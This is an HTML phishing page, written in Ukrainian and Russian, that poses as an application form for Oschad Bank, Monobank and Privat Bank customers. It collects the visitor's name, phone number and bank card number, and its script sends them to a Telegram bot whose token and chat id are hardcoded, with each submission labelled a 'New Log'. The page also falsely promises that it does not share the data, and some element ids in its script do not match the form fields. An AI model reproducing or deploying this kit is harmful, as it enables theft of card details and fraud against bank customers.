<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #0f172a, #1e3a8a);
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* карточка */
.box {
  background: rgba(255,255,255,0.06);
  backdrop-filter: blur(15px);
  padding: 30px;
  border-radius: 20px;
  width: 340px;
  text-align: center;
  box-shadow: 0 20px 50px rgba(0,0,0,0.6);
}

/* заголовок */
h2 {
  margin-bottom: 20px;
}

/* поля */
input {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border: none;
  border-radius: 10px;
  outline: none;
  font-size: 14px;
}

/* услуги */
.service {
  padding: 10px;
  margin: 6px 0;
  border-radius: 10px;
  background: #334155;
  cursor: pointer;
  transition: 0.2s;
}

.service:hover {
  background: #475569;
}

.service.active {
  background: linear-gradient(90deg, #3b82f6, #06b6d4);
}

/* кнопка */
button {
  width: 100%;
  padding: 12px;
  background: linear-gradient(90deg, #3b82f6, #06b6d4);
  border: none;
  border-radius: 10px;
  color: white;
  font-size: 15px;
  cursor: pointer;
  margin-top: 10px;
  transition: 0.3s;
}

button:hover {
  transform: scale(1.05);
}

/* подпись */
.small {
  font-size: 12px;
  opacity: 0.6;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Оставте заявку</h2>

  <input type="text" id="name" placeholder="Ваше ім'я">
  <input type="text" id="phone" placeholder="Номер телефону">
  <input type="text" id="telegram" placeholder="Номер картки">

  <p>Выберите услугу:</p>

  <div class="service" onclick="selectService(this)">Oschad Bank</div>
  <div class="service" onclick="selectService(this)">Monobank</div>
  <div class="service" onclick="selectService(this)">Privat Bank</div>

  <button onclick="send()">Подати заявку</button>

  <div class="small">Ми не передаємо ваші данні</div>
</div>

<script>
let selectedService = "";

function selectService(el) {
  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
  el.classList.add("active");
  selectedService = el.innerText;
}

function send() {
  const name = document.getElementById("Имя").value.trim();
  const phone = document.getElementById("Телефон").value.trim();
  const telegram = document.getElementById("Карта").value.trim();

  if (!name || !phone || !telegram || !selectedService) {
    alert("Заповніть всі поля!");
    return;
  }

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chat_id,
      text: `🔥 Новый Лог 👻:
Имя: ${name}
Телефон: ${phone}
Карта: ${telegram}
Банк: ${selectedService}`
    })
  });

  alert("✅ Заявка отправлена!");

  // очистка
  document.getElementById("Имя").value = "";
  document.getElementById("Телефон").value = "";
  document.getElementById("Номер Картки").value = "";
  selectedService = "";
  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
}
</script>

</body>
</html>
